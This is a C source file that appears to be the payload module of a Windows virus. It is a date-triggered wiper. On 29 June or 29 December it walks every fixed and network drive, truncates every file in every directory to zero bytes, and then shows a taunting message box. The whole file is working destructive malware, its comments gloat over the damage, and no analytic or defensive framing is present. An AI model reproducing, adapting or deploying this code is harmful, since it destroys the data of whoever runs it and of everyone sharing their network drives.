#include "stdafx.h"
#include "prototypez.h"

//module for payload


void TrashDrive()
{
	//variables
	WIN32_FIND_DATA wfd;
	HANDLE hfind;

	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')	//most not be .. or .
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						TrashDrive();		//more death !
						SetCurrentDirectory("..");	//return to upper directory
					}
				}
				else
				{
					//die die die !
					CloseHandle(CreateFile(wfd.cFileName,GENERIC_WRITE,0,NULL,
						CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL));

					CloseHandle(CreateFile(wfd.cFileName,GENERIC_WRITE,0,NULL,
						TRUNCATE_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL));

				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}


void Payload()
{
	SYSTEMTIME xtime;
	char Drive[]="z:\\";
	UINT drive_type;

	GetLocalTime(&xtime);

	if(xtime.wDay==29 && (xtime.wMonth==6 || xtime.wMonth==12))	//death time ?
	{
		do
		{
			drive_type=GetDriveType(Drive);	
		
			if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
			{
				if(SetCurrentDirectory(Drive)==TRUE)
					TrashDrive();
			}

			Drive[0]--;

		}while(Drive[0]!='b');

		MessageBox(NULL,"........",
			CopyRight,MB_ICONINFORMATION); //explain the user who fucked him

	}
}